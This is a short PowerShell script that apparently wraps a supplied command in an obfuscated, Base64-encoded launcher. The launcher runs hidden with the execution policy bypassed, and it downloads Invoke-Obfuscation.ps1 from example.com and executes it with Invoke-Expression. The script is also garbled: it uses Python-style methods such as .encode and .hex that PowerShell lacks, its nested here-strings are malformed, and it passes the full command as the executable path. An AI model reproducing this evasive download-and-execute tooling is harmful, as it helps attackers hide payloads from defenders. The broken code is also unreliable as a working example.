# Set variables
$exe_file = $args[0]
$ps_command = $args[1]

# Define PowerShell command to execute
$powershell_command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand "

# Define PowerShell script to obfuscate
$powershell_script = @"
$code = @"
$ps_command
"@
Invoke-Expression (New-Object IO.StreamReader((New-Object System.Net.WebClient).OpenRead('http://example.com/Invoke-Obfuscation.ps1'))).ReadToEnd() | Invoke-Obfuscation -ScriptBlock -Encode -HideCode -OutputEncoding Base64 -Command 'Invoke-Expression ($code)'
"@

# Encode PowerShell script
$encoded_script = $powershell_script.encode('utf-16le')
$encoded_script = $encoded_script.hex()

# Construct full PowerShell command
$full_command = $powershell_command + $encoded_script

# Execute PowerShell command
Start-Process -FilePath "$full_command" -ArgumentList "$exe_file" -Wait